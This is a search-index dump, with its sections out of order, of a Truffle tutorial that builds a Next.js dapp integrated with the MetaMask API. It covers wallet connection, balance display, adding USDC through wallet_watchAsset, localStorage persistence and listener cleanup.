LoadingAction | IdleAction ; type Dispatch = ( action : Action ) => void ; type Status = \"loading\" | \"idle\" | \"pageNotLoaded\" ; type State = { wallet : string | null ; isMetamaskInstalled : boolean ; status : Status ; balance : string | null ; }; const initialState : State = { wallet : null , isMetamaskInstalled : false , status : \"loading\" , balance : null , } as const ; function metamaskReducer ( state : State , action : Action ) : State { switch ( action . type ) { case \"connect\" : { const { wallet , balance } = action ; const newState = { ... state , wallet , balance , status : \"idle\" } as State ; const info = JSON . stringify ( newState ); window . localStorage . setItem ( \"metamaskState\" , info ); return newState ; } case \"disconnect\" : { window . localStorage . removeItem ( \"metamaskState\" ); return { ... state , wallet : null , balance : null }; } case \"pageLoaded\" : { const { isMetamaskInstalled , balance , wallet } = action ; return { ... state , isMetamaskInstalled , status : \"idle\" , wallet , balance }; } case \"loading\" : { return { ... state , status : \"loading\" }; } case \"idle\" : { return { ... state , status : \"idle\" }; } default : { throw new Error ( \"Unhandled action type\" ); } } } const MetamaskContext = React . createContext < { state : State ; dispatch : Dispatch } | undefined > ( undefined ); function MetamaskProvider ({ children } : PropsWithChildren ) { const [ state , dispatch ] = React . useReducer ( metamaskReducer , initialState ); const value = { state , dispatch }; return ( < MetamaskContext . Provider value = { value } > { children } < /MetamaskContext.Provider> ); } function useMetamask () { const context = React . useContext ( MetamaskContext ); if ( context === undefined ) { throw new Error ( \"useMetamask must be used within a MetamaskProvider\" ); } return context ; } export { MetamaskProvider , useMetamask }; Create hooks/useListen.tsx import { useMetamask } from \"./useMetamask\" ; export const useListen = () => { const { dispatch } = useMetamask (); return () => { window . ethereum . on ( \"accountsChanged\" , async ( newAccounts : string []) => { if ( newAccounts . length > 0 ) { // uppon receiving a new wallet, we'll request again the balance to synchronize the UI. const newBalance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ newAccounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : newAccounts [ 0 ], balance : newBalance , }); } else { // if the length is 0, then the user has disconnected from the wallet UI dispatch ({ type : \"disconnect\" }); } }); }; }; Update components/Wallet.tsx import Link from \"next/link\" ; import { useListen } from \"../hooks/useListen\" ; import { useMetamask } from \"../hooks/useMetamask\" ; import { Loading } from \"./Loading\" ; export default function Wallet () { const { dispatch , state : { status , isMetamaskInstalled , wallet , balance }, } = useMetamask (); const listen = useListen (); const showInstallMetamask = status !== \"pageNotLoaded\" && ! isMetamaskInstalled ; const showConnectButton = status !== \"pageNotLoaded\" && isMetamaskInstalled && ! wallet ; const isConnected = status !== \"pageNotLoaded\" && typeof wallet === \"string\" ; const handleConnect = async () => { dispatch ({ type : \"loading\" }); const accounts = await window . ethereum . request ({ method : \"eth_requestAccounts\" , }); if ( accounts . length > 0 ) { const balance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ accounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : accounts [ 0 ], balance }); // we can register an event listener for changes to the users wallet listen (); } }; const handleDisconnect = () => { dispatch ({ type : \"disconnect\" }); }; const handleAddUsdc = async () => { dispatch ({ type : \"loading\" }); await window . ethereum . request ({ method : \"wallet_watchAsset\" , params : { type : \"ERC20\" , options : { address : \"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\" , symbol : \"USDC\" , decimals : 18 , image : \"https://cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=023\" , }, }, }); dispatch ({ type : \"idle\" }); }; return ( < div className = \"bg-truffle\" > < div className = \"mx-auto max-w-2xl py-16 px-4 text-center sm:py-20 sm:px-6 lg:px-8\" > < h2 className = \"text-3xl font-bold tracking-tight text-white sm:text-4xl\" > < span className = \"block\" > Metamask API intro < /span> < /h2> < p className = \"mt-4 text-lg leading-6 text-white\" > Follow along with the { \" \" } < Link href = \"https://github.com/GuiBibeau/web3-unleashed-demo\" target = \"_blank\" > < span className = \"underline cursor-pointer\" > Repo < /span> < /Link>{\" \"} in order to learn how to use the Metamask API . < /p> { wallet && balance && ( < div className = \" px-4 py-5 sm:px-6\" > < div className = \"-ml-4 -mt-4 flex flex-wrap items-center justify-between sm:flex-nowrap\" > < div className = \"ml-4 mt-4\" > < div className = \"flex items-center\" > < div className = \"ml-4\" > < h3 className = \"text-lg font-medium leading-6 text-white\" > Address : < span > { wallet } < /span> < /h3> < p className = \"text-sm text-white\" > Balance : { \" \" } < span > {( parseInt ( balance ) / 1000000000000000000 ). toFixed ( 4 )}{ \" \" } ETH < /span> < /p> < /div> < /div> < /div> < /div> < /div> )} { showConnectButton && ( < button onClick = { handleConnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Connect Wallet\" } < /button> )} { showInstallMetamask && ( < Link href = \"https://metamask.io/\" target = \"_blank\" > < a className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Install Metamask < /a> < /Link> )} { isConnected && ( < div className = \"flex w-full justify-center space-x-2\" > < button onClick = { handleAddUsdc } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Add Token\" } < /button> < button onClick = { handleDisconnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Disconnect < /button> < /div> )} < /div> < /div> ); } Finally, we will update our pages/index.tsx file with a useEffect to wrap all of these final changes up. Update pages/index/tsx import type { NextPage } from \"next\" ; import { useEffect } from \"react\" ; import Wallet from \"../components/Wallet\" ; import { useListen } from \"../hooks/useListen\" ; import { useMetamask } from \"../hooks/useMetamask\" ; const Home : NextPage = () => { const { dispatch } = useMetamask (); const listen = useListen (); useEffect (() => { if ( typeof window !== undefined ) { // start by checking if window.ethereum is present, indicating a wallet extension const ethereumProviderInjected = typeof window . ethereum !== \"undefined\" ; // this could be other wallets so we can verify if we are dealing with metamask // using the boolean constructor to be explecit and not let this be used as a falsy value (optional) const isMetamaskInstalled = ethereumProviderInjected && Boolean ( window . ethereum . isMetaMask ); const local = window . localStorage . getItem ( \"metamaskState\" ); // user was previously connected, start listening to MM if ( local ) { listen (); } // local could be null if not present in LocalStorage const { wallet , balance } = local ? JSON . parse ( local ) : // backup if local storage is empty { wallet : null , balance : null }; dispatch ({ type : \"pageLoaded\" , isMetamaskInstalled , wallet , balance }); } }, []); return ( <> < Wallet /> < /> ); }; export default Home ; In this last page update to pages/index.tsx , we have relocated the useEffect from the hooks/useMetaMask.tsx page. This hook is consuming dispatch , so the proper next step would be to create a layout page with NextJS, but, since we only have one page, we simply added this code here. We have updated our hooks/useMetamask.tsx page's PageLoadAction to include wallet and balance as well as the code required to access our local storage and rehydrate our app. With those changes in place we have also updated our components/Wallet.tsx page to use our useListen hook since we are using that code in multiple places now, updated the showAddToken variable to a more descriptive name of isConnected , and added a handleDisconnect() function to dispatch an action clearing local storage in our browser. This also required a slight update to our JSX/HTML to display our buttons more neatly. Checkout the Diff to see what changed Remove Listeners after Disconnect \u00b6 We have one final change we want to make to ensure that we stop listening to changes once the user has disconnected their wallet. We will update the and files. This will make the TypeScript definitions file aware of the removeAllListeners() method we will be using, as well as adding the necessary code to the disconnect case inside the metamaskReducer . Update types.d.ts file: type InjectedProviders = { isMetaMask? : true ; }; interface Window { ethereum : InjectedProviders & { on : ( ...args : any []) => void ; removeListener : ( ...args : any []) => void ; removeAllListeners : ( ...args : any []) => void ; request < T = any > ( args : any ) : Promise < T > ; }; } Update the case statement in the useMetamask.tsx file to: case \"disconnect\" : { window . localStorage . removeItem ( \"metamaskState\" ); if ( typeof window . ethereum !== undefined ) { window . ethereum . removeAllListeners ([ \"accountsChanged\" ]); } return { ... state , wallet : null , balance : null }; } Again, here we have ensured that all listeners added after connecting the wallet stop listening once the user is disconnected. You can always switch to the final branch of this repo to get to the completed state of this demo. This concludes the demo! But you're just getting started; for a challenge, try updating the UI, try to add functionality to switch chains, and overall, have fun. If you have any questions or need help with MetaMask, reach out to our DevRel team on Twitter. You can contact Gui Bibeau and Eric Bishard with any questions or feedback. One final note, Gui has a great resource and blog called frontend-devops where he waxes poetically about web, full stack development, and UX which. A great resource for Web2 developers getting into Web3 and seasoned developers alike! Connect with us \u00b6 If you want to talk about this content, make suggestions for what you'd like to see, or ask questions about the series, join our Discord ! See other episodes here . Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: Build a dapp with Next.js and the MetaMask API"}, {"location": "guides/metamask-api/#web3-unleashed-build-a-dapp-with-nextjs-and-the-metamask-api", "text": "Written by Eric Bishard Last updated 10/12/2022", "title": "Web3 Unleashed: Build a dapp with Next.js and the MetaMask API"}, {"location": "guides/metamask-api/#overview", "text": "In this edition of Web3 Unleashed , we're interviewing the MetaMask DevRel team Gui Bibeau and Eric Bishard about the MetaMask API and other tools and features on the horizon like their MetaMask SDK. We will be building a dapp live with them to custom integrate MetaMask into a NextJS application! If you would like to follow along with the Web3 Unleashed Episode #7 demo during or after the stream, below are the steps we walked through to build our dapp integration with MetaMask API.", "title": "Overview"}, {"location": "guides/metamask-api/#prerequisites", "text": "MetaMask Extension NodeJS NPM Git", "title": "Prerequisites"}, {"location": "guides/metamask-api/#clone-and-install-dependencies", "text": "Clone the MetaMask API Web3 Unleashed repo . Then, to get your project started, change into the directory and install the dependencies: git clone https://github.com/metamask/nextjs-starter.git cd nextjs-starter npm i && npm run dev This will give us a starting point in a NextJS application to build our demo.", "title": "Clone and Install Dependencies"}, {"location": "guides/metamask-api/#connecting-the-user", "text": "We will start by updating the hooks/useMetamask.tsx file. This is our global app context that utilizes \"out of the box\" Context API in React. Update hooks/useMetamask.tsx file: import React , { useEffect , type PropsWithChildren } from \"react\" ; type ConnectAction = { type : \"connect\" ; wallet : string }; type DisconnectAction = { type : \"disconnect\" }; type PageLoadedAction = { type : \"pageLoaded\" ; isMetamaskInstalled : boolean }; type LoadingAction = { type : \"loading\" }; type Action = | ConnectAction | DisconnectAction | PageLoadedAction | LoadingAction ; type Dispatch = ( action : Action ) => void ; type Status = \"loading\" | \"idle\" | \"pageNotLoaded\" ; type State = { wallet : string | null ; isMetamaskInstalled : boolean ; status : Status ; }; const MetamaskContext = React . createContext < { state : State ; dispatch : Dispatch } | undefined > ( undefined ); const initialState : State = { wallet : null , isMetamaskInstalled : false , status : \"loading\" , } as const ; function metamaskReducer ( state : State , action : Action ) : State { switch ( action . type ) { case \"connect\" : { const { wallet } = action ; return { ... state , wallet , status : \"idle\" }; } case \"disconnect\" : { return { ... state , wallet : null }; } case \"pageLoaded\" : { const { isMetamaskInstalled } = action ; return { ... state , isMetamaskInstalled , status : \"idle\" }; } case \"loading\" : { return { ... state , status : \"loading\" }; } default : { throw new Error ( \"Unhandled action type\" ); } } } function MetamaskProvider ({ children } : PropsWithChildren ) { const [ state , dispatch ] = React . useReducer ( metamaskReducer , initialState ); const value = { state , dispatch }; useEffect (() => { if ( typeof window !== undefined ) { // start by checking if window.ethereum is present, indicating a wallet extension const ethereumProviderInjected = typeof window . ethereum !== \"undefined\" ; // this could be other wallets so we can verify if we are dealing with metamask // using the boolean constructor to be explicit and not let this be used as a falsy value (optional) const isMetamaskInstalled = ethereumProviderInjected && Boolean ( window . ethereum . isMetaMask ); dispatch ({ type : \"pageLoaded\" , isMetamaskInstalled }); } }, []); return ( < MetamaskContext . Provider value = { value } > { children } < /MetamaskContext.Provider> ); } function useMetamask () { const context = React . useContext ( MetamaskContext ); if ( context === undefined ) { throw new Error ( \"useMetamask must be used within a MetamaskProvider\" ); } return context ; } export { MetamaskProvider , useMetamask }; The above change is by far one of our largest changes that we will do at one time but this file is in charge of helping us keep our application state in sync with the wallet state and is crucial so that we can build the components and features that we want. After this change you will might notice red squiggly lines under the window.ethereum object, this is only because if we want TypeScript to stop yelling at us in our code editor, we need to tell it what window.ethereum is type-wise. Add the file types.d.ts to the app root: type InjectedProviders = { isMetaMask? : true ; }; interface Window { ethereum : InjectedProviders & { on : ( ...args : any []) => void ; removeListener ?: ( ...args : any []) => void ; request < T = any > ( args : any ) : Promise < T > ; }; } You should no longer see those warnings in your hooks/useMetamask.tsx file. Create a components/Loading.tsx file: import { type FC } from \"react\" ; const dot = `rounded-full h-2 w-2 mx-0.5 bg-current animate-[blink_1s_ease_0s_infinite_normal_both]\"` ; let style = { animationDelay : \"0.2s\" }; export const Loading : FC = () => { return ( < span className = \"inline-flex text-center items-center leading-7 h-6\" > < span className = { dot } key = \"dot_1\" /> < span className = { dot } style = { style } key = \"dot_2\" /> < span className = { dot } style = { style } key = \"dot_3\" /> < /span> ); }; With our type definitions added, our MetamaskContext Provider updated, and our Loading.tsx in place, we can now make changes to our components/Wallet.tsx file and add a loading state for our app. Update the components/Wallet.tsx file to: import Image from \"next/future/image\" ; import Link from \"next/link\" ; import { useMetamask } from \"../hooks/useMetamask\" ; import { Loading } from \"./Loading\" ; export default function Wallet () { const { dispatch , state : { status , isMetamaskInstalled }, } = useMetamask (); const showInstallMetamask = status !== \"pageNotLoaded\" && ! isMetamaskInstalled ; const showConnectButton = status !== \"pageNotLoaded\" && isMetamaskInstalled ; const handleConnect = async () => { dispatch ({ type : \"loading\" }); const accounts = await window . ethereum . request ({ method : \"eth_requestAccounts\" , }); if ( accounts . length > 0 ) { dispatch ({ type : \"connect\" , wallet : accounts [ 0 ] }); } }; return ( < div className = \"bg-truffle\" > < div className = \"mx-auto max-w-2xl py-16 px-4 text-center sm:py-20 sm:px-6 lg:px-8\" > < h2 className = \"text-3xl font-bold tracking-tight text-white sm:text-4xl\" > < span className = \"block\" > Metamask API intro < /span> < /h2> < p className = \"mt-4 text-lg leading-6 text-white\" > Follow along with the { \" \" } < Link href = \"https://github.com/GuiBibeau/web3-unleashed-demo\" target = \"_blank\" > < span className = \"underline cursor-pointer\" > Repo < /span> < /Link>{\" \"} in order to learn how to use the Metamask API . < /p> { showConnectButton && ( < button onClick = { handleConnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Connect Wallet\" } < /button> )} { showInstallMetamask && ( < Link href = \"https://metamask.io/\" target = \"_blank\" > < a className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Connect Wallet < /a> < /Link> )} < /div> < /div> ); } This imports the loading component, further destructures the return value of our useMetaMask() custom hook, sets up variables to track if MetaMask is installed or connected for conditional rendering, and gives us a handleConnect() function for dispatching changes to our state reducer. If we are tracking our changes we can see that we have touched 4 files by creating or updating/refactoring. At this point we should be able to connect a user to our dapp with MetaMask. Run the project and attempt to connect to your MetaMask wallet. npm run dev Two things are happening now: If a user does not have MetaMask installed they will get a \"Connect Wallet\" button that simply takes you to download MetaMask. If MetaMask is installed they will see a \"Connect Wallet\" button that actually connects their wallet to the dapp. We are not yet hiding the button once connected or displaying any wallet information. As well, you will notice in MetaMask that you are connected to the dapp. To test the Install link you can go into your extension manager and disable MetaMask temporarily. Checkout the Diff to see what changed", "title": "Connecting the User"}, {"location": "guides/metamask-api/#use-the-metamask-api-to-get-user-info", "text": "We want to display the balance from our wallet, and the public address of the wallet account that is connected to our dapp. For this we need to make a few changes again to the hooks/useMetamask.tsx and add the logic and JSX/HTML in our components/Wallet.tsx . Update hooks/useMetamask.tsx to: import React , { useEffect , type PropsWithChildren } from \"react\" ; type ConnectAction = { type : \"connect\" ; wallet : string ; balance : string }; type DisconnectAction = { type : \"disconnect\" }; type PageLoadedAction = { type : \"pageLoaded\" ; isMetamaskInstalled : boolean }; type LoadingAction = { type : \"loading\" }; type Action = | ConnectAction | DisconnectAction | PageLoadedAction | LoadingAction ; type Dispatch = ( action : Action ) => void ; type Status = \"loading\" | \"idle\" | \"pageNotLoaded\" ; type State = { wallet : string | null ; isMetamaskInstalled : boolean ; status : Status ; balance : string | null ; }; const initialState : State = { wallet : null , isMetamaskInstalled : false , status : \"loading\" , balance : null , } as const ; function metamaskReducer ( state : State , action : Action ) : State { switch ( action . type ) { case \"connect\" : { const { wallet , balance } = action ; return { ... state , wallet , balance , status : \"idle\" }; } case \"disconnect\" : { return { ... state , wallet : null }; } case \"pageLoaded\" : { const { isMetamaskInstalled } = action ; return { ... state , isMetamaskInstalled , status : \"idle\" }; } case \"loading\" : { return { ... state , status : \"loading\" }; } default : { throw new Error ( \"Unhandled action type\" ); } } } const MetamaskContext = React . createContext < { state : State ; dispatch : Dispatch } | undefined > ( undefined ); function MetamaskProvider ({ children } : PropsWithChildren ) { const [ state , dispatch ] = React . useReducer ( metamaskReducer , initialState ); const value = { state , dispatch }; useEffect (() => { if ( typeof window !== undefined ) { // start by checking if window.ethereum is present, indicating a wallet extension const ethereumProviderInjected = typeof window . ethereum !== \"undefined\" ; // this could be other wallets so we can verify if we are dealing with metamask // using the boolean constructor to be explecit and not let this be used as a falsy value (optional) const isMetamaskInstalled = ethereumProviderInjected && Boolean ( window . ethereum . isMetaMask ); dispatch ({ type : \"pageLoaded\" , isMetamaskInstalled }); } }, []); return ( < MetamaskContext . Provider value = { value } > { children } < /MetamaskContext.Provider> ); } function useMetamask () { const context = React . useContext ( MetamaskContext ); if ( context === undefined ) { throw new Error ( \"useMetamask must be used within a MetamaskProvider\" ); } return context ; } export { MetamaskProvider , useMetamask }; We have done some slight refactoring to account for the ability to track the state of the wallet balance, added balance to our initialState , and updated our connect action in our reducer Update components/Wallet.tsx to: import Image from \"next/future/image\" ; import Link from \"next/link\" ; import { useMetamask } from \"../hooks/useMetamask\" ; import { Loading } from \"./Loading\" ; export default function Wallet () { const { dispatch , state : { status , isMetamaskInstalled , wallet , balance }, } = useMetamask (); const showInstallMetamask = status !== \"pageNotLoaded\" && ! isMetamaskInstalled ; const showConnectButton = status !== \"pageNotLoaded\" && isMetamaskInstalled && ! wallet ; const handleConnect = async () => { dispatch ({ type : \"loading\" }); const accounts = await window . ethereum . request ({ method : \"eth_requestAccounts\" , }); if ( accounts . length > 0 ) { const balance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ accounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : accounts [ 0 ], balance }); } }; return ( < div className = \"bg-truffle\" > < div className = \"mx-auto max-w-2xl py-16 px-4 text-center sm:py-20 sm:px-6 lg:px-8\" > < h2 className = \"text-3xl font-bold tracking-tight text-white sm:text-4xl\" > < span className = \"block\" > Metamask API intro < /span> < /h2> < p className = \"mt-4 text-lg leading-6 text-white\" > Follow along with the { \" \" } < Link href = \"https://github.com/GuiBibeau/web3-unleashed-demo\" target = \"_blank\" > < span className = \"underline cursor-pointer\" > Repo < /span> < /Link>{\" \"} in order to learn how to use the Metamask API . < /p> { wallet && ( < div className = \" px-4 py-5 sm:px-6\" > < div className = \"-ml-4 -mt-4 flex flex-wrap items-center justify-between sm:flex-nowrap\" > < div className = \"ml-4 mt-4\" > < div className = \"flex items-center\" > < div className = \"ml-4\" > < h3 className = \"text-lg font-medium leading-6 text-white\" > Address : < span > { wallet } < /span> < /h3> < p className = \"text-sm text-white\" > Balance : < span > { balance } < /span> < /p> < /div> < /div> < /div> < /div> < /div> )} { showConnectButton && ( < button onClick = { handleConnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Connect Wallet\" } < /button> )} { showInstallMetamask && ( < Link href = \"https://metamask.io/\" target = \"_blank\" > < a className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Connect Wallet < /a> < /Link> )} < /div> < /div> ); } We have also added balance to our destructured object so that we have access to it in our component, updated the showConnectButton logic, and requested the balance using the eth_getBalance method. We have also updated our JSX/HTML to include an address and balance . This is a great start, but our UI is still lacking and there is more logic we need to properly track our wallet state and update the page because if we connect to our wallet we get a funny display for our balance and if we refresh our page, we don't see our address and balance. But we will now fix those issues. Checkout the Diff to see what changed", "title": "Use the MetaMask API to get User Info"}, {"location": "guides/metamask-api/#two-way-communication-with-metamask", "text": "Again, we will be updating the hooks/useMetamask.tsx and components/Wallet.tsx files. The idea will be to add a few more reducer actions including Loading and Idle states for the page, we will fix our button to say \"Install MetaMask\" instead of \"Connect MetaMask\" , and we will parse the balance to display a readable number. Finally, we will add some code that uses the wallet_watchAsset MetaMask (RPC API) method to add $USDC token to our MetaMask wallet. This will enable our users to see those tokens in their wallet if they have them. If a dApp uses a particular token, we can programmatically do this for them rather than expecting to do it themselves manually through the MetaMask UI. Update hooks/useMetamask.tsx to: import React , { useEffect , type PropsWithChildren } from \"react\" ; type ConnectAction = { type : \"connect\" ; wallet : string ; balance : string }; type DisconnectAction = { type : \"disconnect\" }; type PageLoadedAction = { type : \"pageLoaded\" ; isMetamaskInstalled : boolean }; type LoadingAction = { type : \"loading\" }; type IdleAction = { type : \"idle\" }; type Action = | ConnectAction | DisconnectAction | PageLoadedAction | LoadingAction | IdleAction ; type Dispatch = ( action : Action ) => void ; type Status = \"loading\" | \"idle\" | \"pageNotLoaded\" ; type State = { wallet : string | null ; isMetamaskInstalled : boolean ; status : Status ; balance : string | null ; }; const initialState : State = { wallet : null , isMetamaskInstalled : false , status : \"loading\" , balance : null , } as const ; function metamaskReducer ( state : State , action : Action ) : State { switch ( action . type ) { case \"connect\" : { const { wallet , balance } = action ; return { ... state , wallet , balance , status : \"idle\" }; } case \"disconnect\" : { return { ... state , wallet : null , balance : null }; } case \"pageLoaded\" : { const { isMetamaskInstalled } = action ; return { ... state , isMetamaskInstalled , status : \"idle\" }; } case \"loading\" : { return { ... state , status : \"loading\" }; } case \"idle\" : { return { ... state , status : \"idle\" }; } default : { throw new Error ( \"Unhandled action type\" ); } } } const MetamaskContext = React . createContext < { state : State ; dispatch : Dispatch } | undefined > ( undefined ); function MetamaskProvider ({ children } : PropsWithChildren ) { const [ state , dispatch ] = React . useReducer ( metamaskReducer , initialState ); const value = { state , dispatch }; useEffect (() => { if ( typeof window !== undefined ) { // start by checking if window.ethereum is present, indicating a wallet extension const ethereumProviderInjected = typeof window . ethereum !== \"undefined\" ; // this could be other wallets so we can verify if we are dealing with metamask // using the boolean constructor to be explecit and not let this be used as a falsy value (optional) const isMetamaskInstalled = ethereumProviderInjected && Boolean ( window . ethereum . isMetaMask ); dispatch ({ type : \"pageLoaded\" , isMetamaskInstalled }); } }, []); return ( < MetamaskContext . Provider value = { value } > { children } < /MetamaskContext.Provider> ); } function useMetamask () { const context = React . useContext ( MetamaskContext ); if ( context === undefined ) { throw new Error ( \"useMetamask must be used within a MetamaskProvider\" ); } return context ; } export { MetamaskProvider , useMetamask }; Update components/Wallet.tsx to: import Link from \"next/link\" ; import { useMetamask } from \"../hooks/useMetamask\" ; import { Loading } from \"./Loading\" ; export default function Wallet () { const { dispatch , state : { status , isMetamaskInstalled , wallet , balance }, } = useMetamask (); const showInstallMetamask = status !== \"pageNotLoaded\" && ! isMetamaskInstalled ; const showConnectButton = status !== \"pageNotLoaded\" && isMetamaskInstalled && ! wallet ; const showAddToken = status !== \"pageNotLoaded\" && typeof wallet === \"string\" ; const handleConnect = async () => { dispatch ({ type : \"loading\" }); const accounts = await window . ethereum . request ({ method : \"eth_requestAccounts\" , }); if ( accounts . length > 0 ) { const balance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ accounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : accounts [ 0 ], balance }); // we can register an event listener for changes to the users wallet window . ethereum . on ( \"accountsChanged\" , async ( newAccounts : string []) => { if ( newAccounts . length > 0 ) { // uppon receiving a new wallet, we'll request again the balance to synchronize the UI. const newBalance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ newAccounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : newAccounts [ 0 ], balance : newBalance , }); } else { // if the length is 0, then the user has disconnected from the wallet UI dispatch ({ type : \"disconnect\" }); } }); } }; const handleAddUsdc = async () => { dispatch ({ type : \"loading\" }); await window . ethereum . request ({ method : \"wallet_watchAsset\" , params : { type : \"ERC20\" , options : { address : \"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\" , symbol : \"USDC\" , decimals : 18 , image : \"https://cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=023\" , }, }, }); dispatch ({ type : \"idle\" }); }; return ( < div className = \"bg-truffle\" > < div className = \"mx-auto max-w-2xl py-16 px-4 text-center sm:py-20 sm:px-6 lg:px-8\" > < h2 className = \"text-3xl font-bold tracking-tight text-white sm:text-4xl\" > < span className = \"block\" > Metamask API intro < /span> < /h2> < p className = \"mt-4 text-lg leading-6 text-white\" > Follow along with the { \" \" } < Link href = \"https://github.com/GuiBibeau/web3-unleashed-demo\" target = \"_blank\" > < span className = \"underline cursor-pointer\" > Repo < /span> < /Link>{\" \"} in order to learn how to use the Metamask API . < /p> { wallet && balance && ( < div className = \" px-4 py-5 sm:px-6\" > < div className = \"-ml-4 -mt-4 flex flex-wrap items-center justify-between sm:flex-nowrap\" > < div className = \"ml-4 mt-4\" > < div className = \"flex items-center\" > < div className = \"ml-4\" > < h3 className = \"text-lg font-medium leading-6 text-white\" > Address : < span > { wallet } < /span> < /h3> < p className = \"text-sm text-white\" > Balance : { \" \" } < span > {( parseInt ( balance ) / 1000000000000000000 ). toFixed ( 4 )}{ \" \" } ETH < /span> < /p> < /div> < /div> < /div> < /div> < /div> )} { showConnectButton && ( < button onClick = { handleConnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Connect Wallet\" } < /button> )} { showInstallMetamask && ( < Link href = \"https://metamask.io/\" target = \"_blank\" > < a className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Install Metamask < /a> < /Link> )} { showAddToken && ( < button onClick = { handleAddUsdc } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Add Token\" } < /button> )} < /div> < /div> ); } With those changes in place we can now install, connect to, and view information from our MetaMask wallet. We can also see a nicely formatted version of our ETH balance and we can see $USDC tokens in our wallet. Checkout the Diff to see what changed We have one more UX improvement to push to our dapp.", "title": "Two Way Communication with MetaMask"}, {"location": "guides/metamask-api/#more-ux-goodies", "text": "We'd like to store some MetaMask state in the browser's local storage to help us create a Disconnect button, something that we feel makes the UX better in a dapp. We will register an event listener for changes to the user's wallet, so that when connecting and disconnecting the UX is just a little bit better. We will add a custom React Hook called useListen to help us achieve this and to co-locate some code that would otherwise be added in two different components so that our final code is a bit cleaner. We do a small refactor to get rid of a useEffect and we will display our buttons side by side when we have more than one showing on the page (Disconnect & Add Tokens) and we will use Tailwind's flex-box options to make this easy. Update hooks/useMetamask.tsx import React , { useEffect , type PropsWithChildren } from \"react\" ; type ConnectAction = { type : \"connect\" ; wallet : string ; balance : string }; type DisconnectAction = { type : \"disconnect\" }; type PageLoadedAction = { type : \"pageLoaded\" ; isMetamaskInstalled : boolean ; wallet : string | null ; balance : string | null ; }; type LoadingAction = { type : \"loading\" }; type IdleAction = { type : \"idle\" }; type Action = | ConnectAction | DisconnectAction | PageLoadedAction | LoadingAction | IdleAction ; type Dispatch = ( action : Action ) => void ; type Status = \"loading\" | \"idle\" | \"pageNotLoaded\" ; type State = { wallet : string | null ; isMetamaskInstalled : boolean ; status : Status ; balance : string | null ; }; const initialState : State = { wallet : null , isMetamaskInstalled : false , status : \"loading\" , balance : null , } as const ; function metamaskReducer ( state : State , action : Action ) : State { switch ( action . type ) { case \"connect\" : { const { wallet , balance } = action ; const newState = { ... state , wallet , balance , status : \"idle\" } as State ; const info = JSON . stringify ( newState ); window . localStorage . setItem ( \"metamaskState\" , info ); return newState ; } case \"disconnect\" : { window . localStorage . removeItem ( \"metamaskState\" ); return { ... state , wallet : null , balance : null }; } case \"pageLoaded\" : { const { isMetamaskInstalled , balance , wallet } = action ; return { ... state , isMetamaskInstalled , status : \"idle\" , wallet , balance }; } case \"loading\" : { return { ... state , status : \"loading\" }; } case \"idle\" : { return { ... state , status : \"idle\" }; } default : { throw new Error ( \"Unhandled action type\" ); } } } const MetamaskContext = React . createContext < { state : State ; dispatch : Dispatch } | undefined > ( undefined ); function MetamaskProvider ({ children } : PropsWithChildren ) { const [ state , dispatch ] = React . useReducer ( metamaskReducer , initialState ); const value = { state , dispatch }; return ( < MetamaskContext . Provider value = { value } > { children } < /MetamaskContext.Provider> ); } function useMetamask () { const context = React . useContext ( MetamaskContext ); if ( context === undefined ) { throw new Error ( \"useMetamask must be used within a MetamaskProvider\" ); } return context ; } export { MetamaskProvider , useMetamask }; Create hooks/useListen.tsx import { useMetamask } from \"./useMetamask\" ; export const useListen = () => { const { dispatch } = useMetamask (); return () => { window . ethereum . on ( \"accountsChanged\" , async ( newAccounts : string []) => { if ( newAccounts . length > 0 ) { // uppon receiving a new wallet, we'll request again the balance to synchronize the UI. const newBalance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ newAccounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : newAccounts [ 0 ], balance : newBalance , }); } else { // if the length is 0, then the user has disconnected from the wallet UI dispatch ({ type : \"disconnect\" }); } }); }; }; Update 